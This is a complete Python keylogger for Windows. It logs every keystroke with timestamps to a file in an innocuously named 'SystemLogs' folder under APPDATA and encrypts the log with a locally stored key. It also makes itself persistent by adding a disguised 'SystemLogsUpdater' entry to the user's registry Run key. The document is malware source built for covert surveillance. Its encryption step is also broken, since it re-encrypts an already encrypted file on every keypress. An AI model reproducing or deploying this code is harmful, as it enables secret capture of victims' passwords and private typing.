import os
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

# Set up logging directory and file
log_dir = os.path.join(os.getenv('APPDATA'), 'SystemLogs')  # For Windows
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, 'keylog.txt')

# Encryption setup
key_file = os.path.join(log_dir, 'key.key')
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as kf:
        kf.write(key)
else:
    with open(key_file, "rb") as kf:
        key = kf.read()
fernet = Fernet(key)

# Function to encrypt logs
def encrypt_log():
    with open(log_file, "rb") as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(log_file, "wb") as enc_file:
        enc_file.write(encrypted)

# Function to handle key press
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"{datetime.now()} - [{key}]\n")
    encrypt_log()

# Add to startup
def add_to_startup():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    exe_path = os.path.abspath(__file__)
    try:
        import winreg as reg
        with reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, "SystemLogsUpdater", 0, reg.REG_SZ, exe_path)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

# Run the keylogger
if __name__ == "__main__":
    add_to_startup()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
